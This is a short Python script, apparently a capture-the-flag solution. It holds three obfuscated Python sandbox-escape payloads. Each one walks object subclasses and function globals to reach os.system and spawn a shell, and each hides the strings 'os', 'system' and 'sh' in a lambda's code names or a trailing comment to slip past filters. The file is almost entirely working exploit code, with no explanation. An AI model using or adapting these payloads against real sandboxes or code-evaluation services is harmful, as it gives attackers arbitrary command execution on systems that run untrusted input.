payload = """
(
  (c) for (c) in ().__class__.__base__.__subclasses__()
  if (
    (f := lambda:os.sh.system)
    and (n:=f.__code__.co_names)
    and (c.__module__==n.__getitem__(False))
)
).__next__().__init__.__globals__.get(n.__getitem__(True+True))(n.__getitem__(True))
""".replace(" ", "").replace("\n", "")
# GPTee
print(payload, len(payload), "\n")


payload = """
(
  p:=Meow.split(Meow.__getitem__(-True)).pop,p(),
  (
    (m.close.__globals__.get) for (g) in (p(),)
    for (m) in ().__class__.__base__.__subclasses__()
    if (m.__module__==g)
  ).send(None)(p())(p())
)#sh#system#os#
""".replace(" ", "").replace("\n", "")

# payload = """
# (
#   *(
#     m.close.__globals__.get(b)(c)
#     for (m) in ().__class__.__base__.__subclasses__()
#     for (p) in (Meow.split(Meow.__getitem__(-True)).pop,)
#     for (_,a,b,c) in ((p(),p(),p(),p()),)
#     if (m.__module__==a)
#   ),
# )#sh#system#os#
# """.replace(" ", "").replace("\n", "")

# human slop
print(payload, len(payload), "\n")


payload = """
(
  *(
    d.close.__globals__.get(b)(c)
    for (a,b,c) in ((lambda:os.system.sh).__code__.co_names,)
    for (d) in ().__class__.__base__.__subclasses__()
    if (d.__module__==a)
  )
,)
""".replace(" ", "").replace("\n", "")

# DeepSlop + Human slop
print(payload, len(payload), "\n")
